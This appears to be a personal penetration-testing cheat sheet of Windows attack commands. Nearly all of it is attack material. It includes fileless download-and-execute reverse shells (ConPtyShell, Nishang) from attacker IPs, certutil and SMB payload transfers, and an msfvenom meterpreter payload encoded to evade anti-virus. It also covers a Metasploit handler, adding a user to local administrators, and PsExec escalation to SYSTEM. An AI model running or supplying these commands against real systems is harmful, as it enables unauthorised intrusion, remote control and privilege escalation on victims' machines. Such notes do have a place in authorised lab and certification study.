Invoke script withou saving to disk 

```
IEX(IWR http://192.168.119.228/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.119.228 53
```

RDP from powershell

```
mstsc /v:192.168.2
```


File download

a) certurtil
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```
b)  smb
```kali
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

```windows
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

Connect to another user

```
PSEXEC.EXE \\LocalComputerIPAddress -u DOMAIN\my-user -p mypass CMD
```

add user to local admins

```
net localgroup administrators user /add
```

From Admin to System

```
.\PsExec64.exe -acceptula -i -s C:\PrivEsc\reverse.exe
```

Reverse shell with nishang

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.42.147/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.42.147 -Port 443
```


```
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`  

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`

Before running this program, ensure the handler is set up in metasploit:

`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`  

﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

`Start-Process "shell-name.exe"`

This should spawn a meterpreter shell for you!
```


downlaod file powershell
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

```

list file names recursively
```
gci -recurse | Select-Object FullName
```


enumerate SMB version

```
Enumerate SAMBA version on Linux:  
Need 2 console windows  

1st window run this: ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139  
2nd: echo exit | smbclient -L [IP]
```


```
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```